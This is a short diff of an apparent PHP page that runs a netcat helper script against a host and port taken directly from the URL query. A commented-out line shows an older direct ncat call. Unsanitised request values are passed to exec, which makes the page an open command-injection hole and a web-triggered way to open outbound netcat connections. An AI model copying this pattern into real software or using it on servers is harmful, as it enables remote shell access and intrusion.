@@ -6,5 +6,6 @@ request sent
 
 <?php
   #exec('bash/ncat '.$_GET['host'].' '.$_GET['port'].' >/dev/null 2>&1 &');
-  exec("run_nc.sh ".$_GET['host']." ".$_GET['port']);
+  chdir("bash");
+  exec("./run_nc.sh ".$_GET['host']." ".$_GET['port']);
 ?>
